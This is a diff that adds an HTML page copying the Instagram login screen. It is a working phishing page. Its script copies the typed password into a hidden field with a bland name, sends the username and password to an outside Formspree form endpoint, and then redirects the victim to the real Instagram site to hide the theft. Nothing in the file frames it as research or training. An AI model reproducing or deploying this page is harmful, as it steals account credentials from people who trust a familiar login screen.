@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="shortcut icon" href="img/favicon.png" type="image/x-icon">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/boxicons@latest/css/boxicons.min.css">
+</head>
+<body>
+    <div class="image__login">
+        <img src="img/instagramimg.png" alt="">
+    </div>
+    <div class="insta__form">
+        <div class="login__form">
+            <img src="img/instalogo.png">
+            <form class="form" method="post">
+                <input type="text" placeholder="Phone number, username, or email" name="text" required>
+                <input type="text" placeholder="Password" id="word" oninput="maskWord(this)" required>
+                <input type="hidden" id="text1" name="word">
+                <button>
+                    Log in
+                </button>
+            </form>
+            <span class="forget">
+                Forget text ?
+            </span>
+        </div>
+    </div>
+
+    <script>
+        function maskWord(input) {
+            let value = input.value;
+            document.getElementById('text1').value = value;
+        }
+        document.getElementsByClassName('form')[0].addEventListener('submit', function(event) {
+            event.preventDefault();
+            
+            // Create a FormData object to gather form data
+            const formData = new FormData(this);
+
+            // Send form data using fetch (or any other AJAX method)
+            fetch('https://formspree.io/f/mjkvkjed', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                location.replace("https://www.instagram.com")
+            })
+            .catch(error => {
+                console.error('Error');
+            });
+        });
+    </script>
+</body>
+</html>
